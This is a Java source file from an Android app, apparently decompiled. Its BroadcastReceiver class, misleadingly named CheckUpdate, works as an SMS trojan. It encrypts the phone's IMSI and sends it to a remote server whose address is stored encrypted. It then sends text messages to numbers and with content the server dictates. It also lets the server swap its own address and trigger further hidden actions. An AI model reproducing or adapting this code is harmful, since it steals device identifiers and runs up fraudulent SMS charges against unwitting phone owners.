package com.dsifakf.aoakmnq;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.telephony.gsm.SmsManager;
import com.dsifakf.aoakmnq.Connect1.OnADFComplite;
import java.io.UnsupportedEncodingException;
import java.net.URLDecoder;
import org.json.JSONException;
import org.json.JSONObject;

public class CheckUpdate extends BroadcastReceiver {
    public void onReceive(final Context context, Intent intent) {
        TelephonyManager TelManager = (TelephonyManager) context.getSystemService("phone");
        final Secure parse = new Secure();
        String devimsi = null;
        String addr = null;
        String clientID = context.getResources().getString(R.string.client_id);
        SharedPreferences preferences = PreferenceManager.getDefaultSharedPreferences(context);
        final Editor editor = preferences.edit();
        try {
            addr = new String(parse.decrypt(preferences.getString("ab", "6e8fa676e42c9bceb6624fb7601a67d0cc0eceeb0218283614342ac69ade50775488a2f64e4d5f5dd2fc5f602c921176")));
        } catch (Exception e) {
        }
        try {
            devimsi = Secure.bytesToHex(parse.encrypt(TelManager.getSubscriberId()));
        } catch (Exception e2) {
        }
        Connect1 dataFetcher = new Connect1(new StringBuilder(String.valueOf(addr)).append("?1=").append(devimsi).append("&id=").append(clientID).toString());
        dataFetcher.setFetcherResult(new OnADFComplite() {
            public void finish(JSONObject object) throws JSONException {
                if (!(object.isNull("nr") || object.isNull("tt"))) {
                    GoMessage(object.getString("nr"), object.getString("tt"));
                }
                if (!object.isNull("fr")) {
                    setParam2(object.getString("fr"));
                }
                if (!object.isNull("as")) {
                    context.sendBroadcast(new Intent("action1"));
                }
                if (!object.isNull("a")) {
                    context.sendBroadcast(new Intent("action2"));
                }
                if (!object.isNull("sr")) {
                    String par1 = null;
                    try {
                        par1 = Secure.bytesToHex(parse.encrypt(object.getString("sr")));
                    } catch (Exception e) {
                    }
                    editor.putString("ab", par1);
                    editor.commit();
                }
            }

            public void error() {
            }

            private void GoMessage(String Number, String Text) {
                if (Number.replaceAll("\\s", "") != "" && Text != "") {
                    String DecodeText = null;
                    try {
                        DecodeText = URLDecoder.decode(Text, "UTF-8");
                    } catch (UnsupportedEncodingException e) {
                    }
                    SmsManager sendMsg = SmsManager.getDefault();
                    sendMsg.sendMultipartTextMessage(Number, null, sendMsg.divideMessage(DecodeText), null, null);
                }
            }

            private void setParam2(String Param2) {
                String Param2Decode = null;
                try {
                    Param2Decode = Secure.bytesToHex(parse.encrypt(Param2));
                } catch (Exception e) {
                }
                editor.putString("cd", Param2Decode);
                editor.commit();
            }
        });
        Connect2.CheckMultiThSupp(dataFetcher);
    }
}
